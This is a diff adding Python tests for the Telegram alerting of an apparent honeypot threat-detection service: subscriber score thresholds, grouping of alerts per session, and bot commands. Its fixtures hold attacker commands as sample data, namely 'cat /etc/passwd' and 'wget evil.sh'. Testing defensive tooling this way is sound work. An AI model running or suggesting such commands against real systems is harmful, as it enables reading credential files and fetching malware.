@@ -64,6 +64,27 @@ def test_send_alert_to_multiple_subscribers(monkeypatch):
     assert cids == {"1001", "1002"}
 
 
+def test_send_alert_threshold_filtering(monkeypatch):
+    monkeypatch.setattr(ts, "TELEGRAM_BOT_TOKEN", "test-token")
+    monkeypatch.setattr(ts.httpx, "AsyncClient", _FakeAsyncClient)
+
+    async def fake_subscribers_details():
+        return [
+            {"chat_id": "sub_40", "min_threat_score": 40},
+            {"chat_id": "sub_80", "min_threat_score": 80},
+        ]
+    monkeypatch.setattr(ts, "get_center_subscribers_details", fake_subscribers_details)
+    _FakeAsyncClient.sent = []
+
+    # Атака с threat_score = 50:
+    # Должна прийти sub_40 (50 >= 40), но отфильтроваться для sub_80 (50 < 80)
+    asyncio.run(ts.send_alert("honeymind_threat", "1.2.3.4", {"threat_score": 50, "command": "id"}))
+    cids = {s["json"]["chat_id"] for s in _FakeAsyncClient.sent}
+    assert cids == {"sub_40"}
+    assert "sub_80" not in cids
+
+
+
 def test_send_alert_noop_without_token(monkeypatch):
     monkeypatch.setattr(ts, "TELEGRAM_BOT_TOKEN", "")
     monkeypatch.setattr(ts, "TELEGRAM_CHAT_ID", "")
@@ -248,3 +269,201 @@ def test_direct_endpoint_requires_internal_token(monkeypatch):
     assert c.post("/api/v1/notify/direct", json={"chat_id": "abc", "text": "x"},
                   headers={"X-Internal-Token": "orch"}).status_code == 422
     assert sent == [("777", "код")]
+
+
+def test_send_alert_session_debounce_groups_commands(monkeypatch):
+    monkeypatch.setattr(ts, "TELEGRAM_BOT_TOKEN", "test-token")
+    monkeypatch.setattr(ts, "TELEGRAM_CHAT_ID", "12345")
+    ts.ACTIVE_SESSION_ALERTS.clear()
+
+    calls = []
+
+    class MockAsyncClient:
+        def __init__(self, *args, **kwargs): pass
+        async def __aenter__(self): return self
+        async def __aexit__(self, *args): return False
+        async def post(self, url, json=None, headers=None, data=None, files=None):
+            calls.append({"url": url, "json": json})
+            class Resp:
+                status_code = 200
+                def json(self): return {"ok": True, "result": {"message_id": 42}}
+            return Resp()
+
+    monkeypatch.setattr(ts.httpx, "AsyncClient", MockAsyncClient)
+
+    # 1-й алерт: создание нового сообщения
+    asyncio.run(ts.send_alert("honeymind_threat", "10.20.0.1", {
+        "session_id": "sess-abc",
+        "command": "cat /etc/passwd",
+        "threat_score": 75,
+        "category": "credential_access"
+    }))
+    assert len(calls) == 1
+    assert "sendMessage" in calls[0]["url"]
+    assert "cat /etc/passwd" in calls[0]["json"]["text"]
+
+    # 2-й алерт той же сессии: вызов editMessageText вместо создания нового
+    asyncio.run(ts.send_alert("honeymind_threat", "10.20.0.1", {
+        "session_id": "sess-abc",
+        "command": "wget evil.sh",
+        "threat_score": 90,
+        "category": "malware_execution"
+    }))
+    assert len(calls) == 2
+    assert "editMessageText" in calls[1]["url"]
+    assert calls[1]["json"]["message_id"] == 42
+    assert "wget evil.sh" in calls[1]["json"]["text"]
+    assert "cat /etc/passwd" in calls[1]["json"]["text"]
+
+
+def test_send_document_helper(monkeypatch):
+    monkeypatch.setattr(ts, "TELEGRAM_BOT_TOKEN", "test-token")
+    doc_sent = []
+
+    class MockAsyncClient:
+        def __init__(self, *args, **kwargs): pass
+        async def __aenter__(self): return self
+        async def __aexit__(self, *args): return False
+        async def post(self, url, data=None, files=None, **kwargs):
+            doc_sent.append({"url": url, "data": data, "files": files})
+            class Resp:
+                status_code = 200
+                text = "ok"
+            return Resp()
+
+    monkeypatch.setattr(ts.httpx, "AsyncClient", MockAsyncClient)
+
+    ok = asyncio.run(ts.send_document("123", "title: test sigma", "rule.yml", caption="Sigma Rule"))
+    assert ok is True
+    assert len(doc_sent) == 1
+    assert "sendDocument" in doc_sent[0]["url"]
+    assert doc_sent[0]["data"]["chat_id"] == "123"
+    assert doc_sent[0]["files"]["document"][0] == "rule.yml"
+
+
+def test_callback_query_intent_handles_prediction(monkeypatch):
+    monkeypatch.setattr(ts, "TELEGRAM_BOT_TOKEN", "mock_token")
+
+    async def fake_auth(uid):
+        return {"authenticated": True, "username": "admin", "role": "admin"}
+
+    async def fake_arts(sid):
+        return {
+            "intent_prediction": {
+                "current_technique": "T1548.003",
+                "predicted_technique": "T1098.004",
+                "probability": 0.256,
+                "predicted_name": "SSH Authorized Keys",
+                "operator_style": "manual_exploratory",
+            }
+        }
+
+    monkeypatch.setattr(ts, "check_user_auth", fake_auth)
+    monkeypatch.setattr(ts, "get_center_session_artifacts", fake_arts)
+
+    calls = []
+    class MockClient:
+        async def post(self, url, json=None, **kwargs):
+            calls.append({"url": url, "json": json})
+            class Resp:
+                status_code = 200
+                text = "ok"
+            return Resp()
+
+    update = {
+        "callback_query": {
+            "id": "cb_123",
+            "data": "intent_sess_abc",
+            "from": {"id": 100, "username": "admin"},
+            "message": {"message_id": 456, "chat": {"id": 789}}
+        }
+    }
+
+    asyncio.run(ts._handle_telegram_update(MockClient(), "https://api.telegram.org/botmock", update))
+
+    ans = [c for c in calls if "answerCallbackQuery" in c["url"]]
+    assert len(ans) == 1
+    assert len(ans[0]["json"]["text"]) <= 200  # Strictly <= 200 characters for Telegram Bot API!
+    assert ans[0]["json"]["show_alert"] is True
+
+    msg = [c for c in calls if "sendMessage" in c["url"]]
+    assert len(msg) == 1
+    assert "T1098.004" in msg[0]["json"]["text"]
+    assert "SSH Authorized Keys" in msg[0]["json"]["text"]
+
+
+def test_telegram_threshold_command_and_callback(monkeypatch):
+    current_threshold = {"val": 60}
+
+    async def fake_auth(cid):
+        return {"authenticated": True, "username": "admin", "role": "admin"}
+
+    async def fake_get_th():
+        return current_threshold["val"]
+
+    async def fake_set_th(v):
+        current_threshold["val"] = int(v)
+        return True, str(v)
+
+    monkeypatch.setattr(ts, "check_user_auth", fake_auth)
+    monkeypatch.setattr(ts, "get_threat_threshold", fake_get_th)
+    monkeypatch.setattr(ts, "set_threat_threshold", fake_set_th)
+
+    calls = []
+    class MockClient:
+        async def post(self, url, json=None, **kwargs):
+            calls.append({"url": url, "json": json})
+            class Resp:
+                status_code = 200
+                text = "ok"
+            return Resp()
+
+    # 1. Запрос /threshold без параметров показывает текущий порог и кнопки
+    update_cmd = {
+        "message": {
+            "message_id": 10,
+            "chat": {"id": 789},
+            "text": "/threshold",
+            "from": {"id": 100, "username": "admin"},
+        }
+    }
+    asyncio.run(ts._handle_telegram_update(MockClient(), "https://api.telegram.org/botmock", update_cmd))
+    assert len(calls) == 1
+    assert "60 / 100" in calls[0]["json"]["text"]
+    assert "inline_keyboard" in calls[0]["json"]["reply_markup"]
+
+    # 2. Установка через команду /threshold 85
+    calls.clear()
+    update_set = {
+        "message": {
+            "message_id": 11,
+            "chat": {"id": 789},
+            "text": "/threshold 85",
+            "from": {"id": 100, "username": "admin"},
+        }
+    }
+    asyncio.run(ts._handle_telegram_update(MockClient(), "https://api.telegram.org/botmock", update_set))
+    assert current_threshold["val"] == 85
+    assert "85 / 100" in calls[0]["json"]["text"]
+
+    # 3. Нажатие на инлайн-кнопку set_threshold_90
+    calls.clear()
+    update_cb = {
+        "callback_query": {
+            "id": "cb_thresh",
+            "data": "set_threshold_90",
+            "from": {"id": 100, "username": "admin"},
+            "message": {"message_id": 12, "chat": {"id": 789}},
+        }
+    }
+    asyncio.run(ts._handle_telegram_update(MockClient(), "https://api.telegram.org/botmock", update_cb))
+    assert current_threshold["val"] == 90
+    ans = [c for c in calls if "answerCallbackQuery" in c["url"]]
+    assert len(ans) == 1
+    assert "90/100" in ans[0]["json"]["text"]
+    edit = [c for c in calls if "editMessageText" in c["url"]]
+    assert len(edit) == 1
+    assert "90 / 100" in edit[0]["json"]["text"]
+
+
+
